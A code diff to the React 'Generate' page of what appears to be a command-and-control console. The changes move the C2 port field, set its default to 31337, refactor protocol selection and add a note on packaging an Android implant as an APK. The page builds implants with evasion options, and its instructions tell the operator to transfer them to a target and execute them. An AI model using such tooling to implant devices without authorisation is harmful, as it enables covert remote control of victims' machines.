@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react'
-import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap, Shield, AlertCircle, CheckCircle2, Radio } from 'lucide-react'
+import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap, Shield, AlertCircle, CheckCircle2, Radio, Package } from 'lucide-react'
 import { apiFetch, apiPost, useAPI } from '../hooks/useAPI'
 import type { Listener } from '../types'
 
@@ -28,7 +28,7 @@ export default function Generate() {
   const [protocol, setProtocol] = useState('mtls')
   const [format,   setFormat]   = useState('exe')
   const [c2host,   setC2Host]   = useState('')
-  const [c2port,   setC2Port]   = useState(8888)
+  const [c2port,   setC2Port]   = useState(31337)
   const [name,     setName]     = useState('')
   const [evasion,  setEvasion]  = useState<Record<string, boolean>>({})
   const [domains,  setDomains]  = useState('')
@@ -43,26 +43,18 @@ export default function Generate() {
   const { data: listeners } = useAPI<Listener[]>('/api/listeners', 5_000)
 
   function pickListener(l: Listener) {
-    // The listener tells us:
-    //   - protocol: what channel the implant should use (mtls, https, http, dns)
-    //   - port: what port the listener is on → this IS the implant's C2 port
-    //
-    // The operator still needs to set C2 host = the server's PUBLIC IP
-    // (not 0.0.0.0 which is what the listener binds to)
     const proto = l.protocol?.toLowerCase() ?? 'mtls'
-    // Only set protocol if it's supported by the current OS options
     if (opts?.protocols?.some(p => p.value === proto)) {
       setProtocol(proto)
     }
-    // Set port to match the listener
+    // Port lives in Step 3 — set it from the listener's actual port
     setC2Port(l.port)
-    // For DNS, pre-fill domains from the listener config
     if (proto === 'dns' && l.domains && l.domains.length > 0) {
       setDomains(l.domains.join(', '))
     }
   }
 
-  // ── Load smart options when OS or arch changes ──────────────────────────
+  // ── Load smart options when OS changes ─────────────────────────────────
   useEffect(() => {
     setLoading(true)
     setResult(null)
@@ -70,27 +62,28 @@ export default function Generate() {
     apiFetch<GenOptions>(`/api/generate/options?os=${os}&arch=${arch}`)
       .then(o => {
         setOpts(o)
-        // Set smart defaults from new OS
         setFormat(o.formats[0]?.value ?? 'exe')
-        setProtocol(o.protocols[0]?.value ?? 'mtls')
-        setC2Port(o.default_ports[o.protocols[0]?.value ?? 'mtls'] ?? 8888)
-        // Apply default evasion checkboxes
+        const firstProto = o.protocols[0]?.value ?? 'mtls'
+        setProtocol(firstProto)
+        setC2Port(o.default_ports[firstProto] ?? 31337)
         const def: Record<string, boolean> = {}
         o.evasion.forEach(e => { def[e.key] = e.default })
         setEvasion(def)
-        // Default arch for android
         if (os === 'android') setArch('arm64')
       })
       .catch(() => {})
       .finally(() => setLoading(false))
   }, [os])
 
-  // ── Update port when protocol changes ───────────────────────────────────
-  useEffect(() => {
-    if (opts?.default_ports?.[protocol]) {
-      setC2Port(opts.default_ports[protocol])
+  // ── Update port when protocol changes in Step 3 ─────────────────────────
+  // (does NOT run when Step 1 listener picker sets protocol — pickListener
+  //  calls setC2Port directly, so both update atomically)
+  function changeProtocol(proto: string) {
+    setProtocol(proto)
+    if (opts?.default_ports?.[proto]) {
+      setC2Port(opts.default_ports[proto])
     }
-  }, [protocol, opts])
+  }
 
   // ── Submit generate request ─────────────────────────────────────────────
   async function submit() {
@@ -119,6 +112,7 @@ export default function Generate() {
 
   const isAndroid = os === 'android'
   const isDNS     = protocol === 'dns'
+  const isAPK     = format === 'apk'
 
   return (
     <div className="flex flex-col gap-6 h-full">
@@ -190,6 +184,17 @@ export default function Generate() {
                   </label>
                 ))}
               </div>
+              {/* APK packaging note */}
+              {isAndroid && isAPK && (
+                <div className="mt-1 flex items-start gap-2 bg-accent/10 border border-accent/30 rounded p-2 text-[10px] text-accent">
+                  <Package size={10} className="shrink-0 mt-0.5" />
+                  <span>
+                    APK packaging is a two-step process: the server first generates a raw ELF binary,
+                    then you package it with <code className="bg-bg px-1 rounded">make android-apk</code> in the project root.
+                    The console command below covers Step 1 (generate ELF).
+                  </span>
+                </div>
+              )}
             </section>
           )}
 
@@ -236,45 +241,36 @@ export default function Generate() {
                   })}
                 </div>
                 <p className="text-[9px] text-muted">
-                  Selecting a listener sets the <strong>protocol</strong> and <strong>port</strong> automatically.
-                  The implant will connect back to these settings.
+                  Picking a listener sets the <strong>channel</strong> and <strong>port</strong> in Step 3 automatically.
                 </p>
               </>
             )}
           </section>
 
-          {/* ── Step 2: Set C2 host ─────────────────────────────── */}
+          {/* ── Step 2: C2 Host ONLY (no port here) ─────────────── */}
           <section className="rounded-lg border border-border bg-surface p-3 flex flex-col gap-2">
             <label className="text-[10px] text-warn uppercase tracking-widest">
-              Step 2 — Set your public C2 host (the IP or domain the implant will connect to)
+              Step 2 — C2 Host (the IP or domain the implant will connect to)
             </label>
-            <div className="grid grid-cols-3 gap-2">
-              <div className="col-span-2">
-                <input value={c2host} onChange={e => setC2Host(e.target.value)}
-                  placeholder="e.g. 192.168.1.50  (NOT 0.0.0.0 or localhost!)"
-                  className={`w-full bg-bg border rounded px-3 py-2 text-xs text-text placeholder-muted focus:border-warn outline-none font-mono ${
-                    !c2host.trim() ? 'border-warn/50' : 'border-border'
-                  }`} />
-              </div>
-              <div>
-                <input type="number" value={c2port} onChange={e => setC2Port(parseInt(e.target.value) || 0)}
-                  className="w-full bg-bg border border-border rounded px-3 py-2 text-xs text-text focus:border-primary outline-none font-mono" />
-              </div>
-            </div>
+            <input value={c2host} onChange={e => setC2Host(e.target.value)}
+              placeholder="e.g. 192.168.1.50  (NOT 0.0.0.0 or localhost!)"
+              className={`w-full bg-bg border rounded px-3 py-2 text-xs text-text placeholder-muted focus:border-warn outline-none font-mono ${
+                !c2host.trim() ? 'border-warn/50' : 'border-border'
+              }`} />
             {!c2host.trim() && (
               <p className="text-[9px] text-warn">
-                ⚠ Enter your server's reachable IP. The implant on the target device will connect TO this address.
+                ⚠ Enter your server's reachable IP or domain. The implant will connect TO this address from the target.
               </p>
             )}
           </section>
 
-          {/* ── Step 3: Choose channel (or override after picking listener) ── */}
+          {/* ── Step 3: C2 Channel + Port ────────────────────────── */}
           {opts && (
             <section className="rounded-lg border border-border bg-surface p-3 flex flex-col gap-2">
               <label className="text-[10px] text-muted uppercase tracking-widest flex items-center gap-1">
-                <Zap size={10} /> Step 3 — C2 Channel
+                <Zap size={10} /> Step 3 — C2 Channel + Port
                 <span className="text-muted font-normal normal-case ml-1">
-                  (auto-set by listener picker above, or choose manually)
+                  (auto-set by Step 1, or choose manually)
                 </span>
               </label>
               <div className="flex flex-col gap-1">
@@ -283,18 +279,30 @@ export default function Generate() {
                     protocol === p.value ? 'bg-bg' : ''
                   }`}>
                     <input type="radio" name="protocol" value={p.value} checked={protocol === p.value}
-                      onChange={() => { setProtocol(p.value); if (opts.default_ports?.[p.value]) setC2Port(opts.default_ports[p.value]) }}
+                      onChange={() => changeProtocol(p.value)}
                       className="accent-primary mt-0.5 shrink-0" />
                     <div className="flex-1 min-w-0">
                       <div className="flex items-center justify-between gap-2">
                         <span className={`text-xs font-semibold ${protocol === p.value ? 'text-primary' : 'text-text'}`}>{p.label}</span>
-                        <span className="text-[10px] text-muted font-mono shrink-0">:{opts.default_ports?.[p.value] ?? c2port}</span>
+                        <span className="text-[10px] text-muted font-mono shrink-0">default :{opts.default_ports?.[p.value] ?? '—'}</span>
                       </div>
                       {p.description && <div className="text-[10px] text-muted truncate">{p.description}</div>}
                     </div>
                   </label>
                 ))}
               </div>
+
+              {/* Port field — this is the ONE place where port lives */}
+              <div className="flex items-center gap-2 mt-1 pt-2 border-t border-border/50">
+                <label className="text-[10px] text-muted whitespace-nowrap">C2 Port</label>
+                <input type="number" value={c2port}
+                  onChange={e => setC2Port(parseInt(e.target.value) || 0)}
+                  className="w-28 bg-bg border border-border rounded px-3 py-1.5 text-xs text-text focus:border-primary outline-none font-mono" />
+                <span className="text-[10px] text-muted">
+                  The implant connects to <span className="font-mono text-text">{c2host || '<host>'} : {c2port}</span>
+                </span>
+              </div>
+
               {isDNS && (
                 <div className="mt-1">
                   <label className="text-[10px] text-muted mb-1 block">DNS Domains (comma-separated)</label>
@@ -388,7 +396,10 @@ export default function Generate() {
                   <li>Start listener: <span className="text-accent font-mono">sudosoc {'>'} {protocol}</span></li>
                   <li>Copy the command above and paste it in the server console</li>
                   <li>Transfer the generated binary to your target</li>
-                  <li>Execute it — new session appears in Sessions tab</li>
+                  {isAndroid && isAPK
+                    ? <li>Package as APK: <span className="text-accent font-mono">make android-apk</span> then install via ADB</li>
+                    : <li>Execute it — new session appears in Sessions tab</li>
+                  }
                 </ol>
               </div>
             </div>
@@ -402,12 +413,12 @@ export default function Generate() {
                 ['OS',       `${os} (${arch})`],
                 ['Format',   opts.formats.find(f => f.value === format)?.label ?? format],
                 ['Channel',  opts.protocols.find(p => p.value === protocol)?.label ?? protocol],
-                ['C2',       c2host ? `${c2host}:${c2port}` : '<not set>'],
+                ['C2',       c2host ? `${c2host}:${c2port}` : `<host>:${c2port}`],
                 ['Evasion',  Object.entries(evasion).filter(([,v]) => v).map(([k]) => k).join(', ') || 'none'],
               ].map(([k, v]) => (
                 <div key={k} className="flex justify-between items-start gap-3">
                   <span className="text-muted shrink-0">{k}</span>
-                  <span className={`text-right break-all ${v === '<not set>' ? 'text-danger' : 'text-text'}`}>{v}</span>
+                  <span className={`text-right break-all ${!c2host && k === 'C2' ? 'text-warn' : 'text-text'}`}>{v}</span>
                 </div>
               ))}
             </div>
